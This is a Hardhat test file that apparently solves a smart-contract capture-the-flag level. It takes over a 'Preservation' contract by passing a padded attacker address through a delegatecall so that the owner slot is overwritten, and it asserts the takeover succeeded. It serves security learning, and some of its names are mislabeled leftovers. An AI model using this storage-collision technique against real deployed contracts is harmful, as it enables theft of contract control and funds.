
const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require( "chai" );
const { ethers } = require("hardhat");

describe("Fallback", function () {
    // Deploys the Fallback contract
    async function deployFallback() {
        const [owner, otherAccount] = await ethers.getSigners();
        const Level17Helper = await hre.ethers.getContractFactory("PreservationDelegate");
        const level17Helper = await Level17Helper.deploy();
        await level17Helper.deployed();
        const Level17 = await hre.ethers.getContractFactory("Preservation");
        const level17 = await Level17.deploy(level17Helper.address, level17Helper.address);
        await level17.deployed();
        console.log(
          `Level17 deployed at address ${level17.address}`
        )
        return {level17, level17Helper, owner, otherAccount};
    }

    /*
    This contract utilizes a library to store two different times for two different timezones. 
    The constructor creates two instances of the library for each time to be stored.
    The goal of this level is for you to claim ownership of the instance you are given.
    */
    describe("Solve", function() {
        it("Should solve level16", async function() {
            const {level17, level17Helper, owner, otherAccount} = await loadFixture(deployFallback);
            // Get the address of otherAccount and pad it out with nulls so we can send it as a
            // uint256
            let contractOwner = await level17.connect(otherAccount).owner();
            expect (contractOwner).equals(owner.address);
            // Pack the address as a uint256
            const address = "0x000000000000000000000000".concat(ethers.utils.hexlify(otherAccount.address).slice(2,))
            // This will delegatecall into our helper contract, which will convert the uin256 into
            // an address and set the owner
            await level17.connect(otherAccount).setFirstTime(address);
            contractOwner = await level17.connect(otherAccount).owner();
            expect (contractOwner).equals(otherAccount.address)
        })
    });
});